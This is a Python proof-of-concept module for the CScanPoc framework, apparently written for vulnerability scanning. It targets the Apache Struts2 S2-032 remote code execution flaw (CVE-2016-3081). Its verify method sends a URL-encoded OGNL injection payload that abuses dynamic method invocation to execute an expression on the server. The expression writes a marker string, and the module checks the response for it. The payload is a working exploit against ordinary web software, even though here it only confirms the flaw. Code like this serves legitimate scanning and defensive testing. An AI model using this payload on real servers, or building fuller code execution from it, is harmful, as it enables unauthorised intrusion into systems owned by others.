# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'apache_struts_0012_p' # 平台漏洞编号，留空
    name = 'Apache Struts2 S2-032远程代码执行漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2016-04-27'  # 漏洞公布时间
    desc = '''
    Apache Struts2中存在漏洞，Apache当启用动态方法调用时，可以传递恶意的表达式，该恶意表达式可用于在服务器端执行任意代码。  
    ''' # 漏洞描述
    ref = 'https://cwiki.apache.org/confluence/display/WW/S2-032' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = 'CVE-2016-3081' #cve编号
    product = 'Apache Struts2'  # 漏洞应用名称
    product_version = 'Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'f03434a1-aac4-40c4-a6b6-9acfb7b25e4a'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-17' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            payloadurl = """?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context%5B%23parameters.obj%5B0%5d%5d.getWriter%28%29.print%28%23parameters.content%5B0%5d%2b602%2b53718%29,1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=92933839f1efb2da9a4799753ee8d79c"""
            request = requests.get('{target}{payload}'.format(target=self.target,payload=payloadurl))
            print request.url
            r = request.text
            if '92933839f1efb2da9a4799753ee8d79c' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
